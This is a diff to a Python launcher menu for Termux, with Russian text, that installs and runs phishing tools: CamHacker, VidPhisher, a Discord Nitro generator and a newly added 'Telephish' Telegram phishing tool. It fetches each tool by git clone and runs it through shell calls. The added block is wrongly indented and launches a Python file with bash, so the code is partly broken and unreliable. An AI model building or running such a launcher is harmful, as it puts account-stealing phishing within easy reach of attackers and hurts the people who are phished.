@@ -28,7 +28,8 @@ while True:
     res()
     print(Fore.GREEN+"    [11] CamHacker  >>  Фотофишинг")
     print(Fore.GREEN+"    [12] VidPhisher >>  Видеофишинг")
-    print(Fore.GREEN+"    [13] Discord    >>  Генератор Nitro")
+    print(Fore.GREEN+"    [13] Telephish  >>  Фишинг в тг")
+    print(Fore.GREEN+"    [15] Discord    >>  Генератор Nitro")
     res()
     print(Style.BRIGHT,Fore.CYAN+"   [20] Страница (3)")
     res()
@@ -54,7 +55,7 @@ while True:
             os.chdir('CamHacker')
             os.system('clear')
             os.system('bash ch.sh')
-            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             os.system('clear')
 
@@ -71,7 +72,7 @@ while True:
             os.chdir('CamHacker')
             os.system('clear')
             os.system('bash ch.sh')
-            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             os.system('clear')
 
@@ -91,7 +92,7 @@ while True:
             os.chdir('VidPhisher')
             os.system('clear')
             os.system('bash vp.sh')
-            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_202 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             os.system('clear')
 
@@ -108,13 +109,58 @@ while True:
             os.chdir('VidPhisher')
             os.system('clear')
             os.system('bash vp.sh')
-            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_202 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             os.system('clear')
 
 
 
-    if inp == '13':
+if inp == '13':
+        filename = "Telephish"
+
+        if os.path.exists(filename):
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] Telephish уже установлен!")
+            time.sleep(2)
+            os.system('clear')
+            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
+            time.sleep(0.5)
+
+            os.chdir('Telephish')
+            os.system('clear')
+            os.system('bash builder.py')
+            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
+            os.chdir('/data/data/com.termux/files/home/installer')
+            os.system('clear')
+
+        else:
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Telephish еще НЕ установлен!")
+            time.sleep(2)
+            
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Telephish...")
+            res()
+            time.sleep(1.5)
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка pyTelegramBotAPI...")
+            res()
+            os.system('pip install pyTelegramBotAPI')
+            os.system('clear')
+            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Telephish...")
+            res()
+            os.system('git clone https://github.com/lamer112311/Telephish')
+            os.chdir('Telephish')
+            os.system('clear')
+            os.system('bash builder.py')
+            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
+            os.chdir('/data/data/com.termux/files/home/installer')
+            os.system('clear')
+
+
+
+  
+    if inp == '15':
         filename = "Discord-Nitro-Generator-and-Checker"
 
         if os.path.exists(filename):
@@ -128,7 +174,7 @@ while True:
             os.chdir('Discord-Nitro-Generator-and-Checker')
             os.system('clear')
             os.system('python3 main.py')
-            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_502 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             print(f'\33]0; Installer\a',
                   end='', flush=True)
@@ -155,7 +201,7 @@ while True:
             os.chdir('Discord-Nitro-Generator-and-Checker')
             os.system('clear')
             os.system('python3 main.py')
-            tsu_302 = input('\n [Нажмите enter чтобы выйти]')
+            tsu_502 = input('\n [Нажмите enter чтобы выйти]')
             os.chdir('/data/data/com.termux/files/home/installer')
             print(f'\33]0; Installer\a',
                   end='', flush=True)
